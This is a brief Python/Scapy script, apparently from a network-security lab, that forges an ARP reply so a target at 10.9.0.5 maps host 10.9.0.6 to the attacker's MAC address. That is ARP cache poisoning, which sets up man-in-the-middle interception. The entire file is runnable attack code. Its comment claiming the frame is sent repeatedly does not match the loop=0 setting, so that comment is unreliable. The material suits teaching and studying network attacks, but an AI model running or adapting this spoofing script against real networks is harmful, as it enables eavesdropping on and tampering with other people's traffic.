#!/usr/bin/env python3
from scapy.all import *

# ***********************************************************************
# attacker is  10.9.0.105  ether   02:42:0a:09:00:69   C  br-9c30b8bbbc0f
#
#   host a is  10.9.0.5    ether   02:42:0a:09:00:05   C  br-9c30b8bbbc0f
#   host b is  10.9.0.6    ether   02:42:0a:09:00:06   C  br-9c30b8bbbc0f
# ***********************************************************************

IP_target   = "10.9.0.5"
MAC_target  = "02:42:0a:09:00:05"

IP_spoofed  = "10.9.0.6"
MAC_spoofed = "02:42:0a:09:00:69"

print("SENDING SPOOFED ARP REPLY")

# Construct the Ethernet frame
ether = Ether(dst=MAC_target, src=MAC_spoofed)

# Construct the ARP reply
arp = ARP(op=2, psrc=IP_spoofed, hwsrc=MAC_spoofed, pdst=IP_target, hwdst=MAC_target)

# Combine into a frame
frame = ether / arp

# Send the frame repeatedly to maintain poisoning
sendp(frame, iface="eth0", inter=2, loop=0)





